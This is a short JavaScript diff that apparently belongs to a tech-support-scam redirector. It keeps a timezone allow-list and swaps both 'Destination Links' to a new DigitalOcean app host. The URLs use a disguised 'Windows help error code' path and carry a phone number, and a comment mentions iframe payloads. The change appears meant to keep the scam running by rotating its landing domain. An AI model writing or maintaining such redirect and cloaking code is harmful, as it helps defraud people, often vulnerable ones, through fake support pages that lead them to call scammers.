@@ -42,8 +42,8 @@ const ALLOWED_TIMEZONES = new Set([
 ]);
 
 // Destination Links
-const LINK_MAC = "https://walrus-app-7lofi.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-034-661";
-const LINK_OTHERS = "https://walrus-app-7lofi.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-034-661";
+const LINK_MAC = "https://jellyfish-app-kjqng.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-034-661";
+const LINK_OTHERS = "https://jellyfish-app-kjqng.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-034-661";
 
 // --- Pre-Compilation Cache Layer ---
 // Helper to generate identical iframe payloads dynamically on boot
